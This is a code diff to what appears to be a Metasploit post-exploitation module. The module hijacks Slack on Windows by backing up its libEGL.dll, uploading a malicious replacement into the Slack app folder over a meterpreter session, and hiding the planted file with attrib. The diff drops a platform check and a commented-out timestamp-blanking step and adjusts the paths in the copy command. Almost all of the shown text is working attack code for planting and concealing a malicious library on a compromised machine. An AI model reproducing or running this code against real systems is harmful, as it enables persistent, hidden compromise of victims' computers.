@@ -132,19 +132,6 @@ class MetasploitModule < Msf::Post
 
 
 
-# ----------------------------------------------
-# Check for proper target Platform (win32|win64)
-# ----------------------------------------------
-def unsupported
-   session = client
-     sys = session.sys.config.sysinfo
-       print_warning("[ABORT]: Operative System => #{sys['OS']}")
-       print_error("Only windows systems are supported by this module...")
-       print_error("Please execute [info] for further information...")
-       print_line("")
-   raise Rex::Script::Completed
-end
-
 
 
 
@@ -158,7 +145,7 @@ def ls_stage1
   p_name = "libEGL.dll" # malicious libEGL.dll
   s_name = "slack.exe" # service executable
   u_path = datastore['LOCAL_PATH']   # /root/libEGL.dll
-  d_path = "%localappdata%\\slack\\app-2.3.2" # remote path on target system
+  d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['LOCAL_PATH'].blank?
@@ -176,7 +163,7 @@ def ls_stage1
       print_warning(" Vulnerable dll agent: #{p_name} found...")
       # backup original dll
       print_good(" Backup original slack dll...")
-      r = session.sys.process.execute("cmd.exe /c COPY /Y #{p_name} libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
+      r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_name}\\#{p_name} #{d_path}\\libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
 
       # upload our malicious libEGL.dll into target system..
@@ -185,11 +172,6 @@ def ls_stage1
       sleep(1.0)
       print_good(" Uploaded : #{u_path} -> #{d_path}\\#{p_name}")
       sleep(1.0)
-
-        # Change remote malicious libEGL.dll timestamp (date:time)
-        # print_good(" Blanking malicious dll agent timestamp...")
-        # client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
-        # sleep(1.5)
 
       # change attributes of libEGL.dll to hidde it from site...
       print_good(" Use attrib command to hidde dll...")
@@ -242,8 +224,6 @@ end
 # ------------------------------------------------
 def run
   session = client
-    # Check for proper target Platform
-    # unsupported if client.platform !~ /win32|win64/i
 
       # Variable declarations (msf API calls)
       sysnfo = session.sys.config.sysinfo
